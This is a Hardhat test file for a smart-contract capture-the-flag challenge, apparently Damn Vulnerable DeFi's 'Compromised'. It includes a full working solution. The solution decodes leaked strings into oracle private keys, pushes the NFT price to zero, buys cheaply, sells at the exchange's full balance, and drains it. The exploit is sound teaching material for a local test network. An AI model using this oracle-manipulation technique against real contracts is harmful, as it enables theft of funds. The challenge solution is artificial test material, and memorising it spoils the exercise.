const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        const leakToPrivateKey = (leak) => {
            // Convert the hex string to a buffer, which is a binary format
            const buffer = Buffer.from(leak.split(` `).join(``), `hex`); // <Buffer 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a ... 38 more bytes>
        
            // Encode the buffer to a UTF-8 string, so that we can determine if it is a format we know
            const utf8Str = buffer.toString(`utf8`); // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
        
            // We determined it might be a base64 encoded string, so decode it back to binary format
            const buffer2 = Buffer.from(utf8Str, `base64`); // <Buffer 30 78 63 36 37 38 65 66 31 61 61 34 35 36 64 61 36 35 63 36 66 63 35 38 36 31 64 34 34 38 39 32 63 64 66 61 63 30 63 36 63 38 63 32 35 36 30 62 66 30 ... 16 more bytes>
        
            // Since it's a binary format, we need to encode it to a UTF-8 string so that we can check the private key
            const privateKey = buffer2.toString(`utf8`); // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
            return privateKey;
        };
        const leakedInformation = [
            '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
            '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
        ]

        // Get private keys and initialize wallets
        const privateKey1 = leakToPrivateKey(leakedInformation[0])
        const privateKey2 = leakToPrivateKey(leakedInformation[1])

        // Get the wallet
        const trustedOracle1 = new ethers.Wallet(privateKey1, ethers.provider)
        const trustedOracle2 = new ethers.Wallet(privateKey2, ethers.provider)

        // Set the price to zero in both oracles
        await this.oracle.connect(trustedOracle1).postPrice('DVNFT', 0)
        await this.oracle.connect(trustedOracle2).postPrice('DVNFT', 0)

        // Since the amount paid must be greater than zero, we pay 1 wei.
        const tx = await this.exchange.connect(attacker).buyOne({value:1})

        // Wait for the transaction to be mined
        const receipt = await tx.wait();

        // Get the return value from the transaction receipt
        const event = receipt.events.find(event => event.event === 'TokenBought');
        const tokenId = event.args.tokenId;
        console.log('tokenId:', tokenId)

        // Set the price back to 9990 ETH, which is the total balance of the exchange
        await this.oracle.connect(trustedOracle1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE)
        await this.oracle.connect(trustedOracle2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE)

        await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId)
        await this.exchange.connect(attacker).sellOne(tokenId)

        // Set the price back to 999 ETH, which is the original price
        await this.oracle.connect(trustedOracle1).postPrice('DVNFT', INITIAL_NFT_PRICE)
        await this.oracle.connect(trustedOracle2).postPrice('DVNFT', INITIAL_NFT_PRICE)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
